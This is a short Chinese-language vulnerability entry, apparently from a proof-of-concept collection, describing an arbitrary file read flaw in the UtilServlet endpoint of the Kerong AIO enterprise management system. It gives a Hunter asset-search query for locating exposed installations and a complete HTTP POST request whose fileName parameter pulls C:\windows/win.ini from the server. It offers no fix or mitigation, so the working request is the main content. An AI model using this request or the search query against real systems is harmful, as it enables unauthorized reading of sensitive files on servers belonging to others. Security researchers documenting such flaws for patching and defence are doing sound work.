# 科荣 AIO 管理系统 UtilServlet 存在任意文件读取漏洞

# 一、漏洞简介
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在任意文件读取漏洞，攻击者可以读取敏感文件。

# 二、影响版本
+ 科荣 AIO 管理系统 

# 三、资产测绘
+ hunter`app.name="科荣 AIO"`
+ 特征

![1699631783798-97153184-155c-4762-9c58-b7c8334bc638.png](./img/KJn1NI1bH8toct3T/1699631783798-97153184-155c-4762-9c58-b7c8334bc638-007622.png)

# 四、漏洞复现
```plain
POST /UtilServlet HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Length: 52
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Upgrade-Insecure-Requests: 1

operation=readErrorExcel&fileName=C:\windows/win.ini
```

![1699631836577-be6e6474-29de-4eba-aca2-4b8170c58b0a.png](./img/KJn1NI1bH8toct3T/1699631836577-be6e6474-29de-4eba-aca2-4b8170c58b0a-883570.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/udgwgxz7zdoguolr>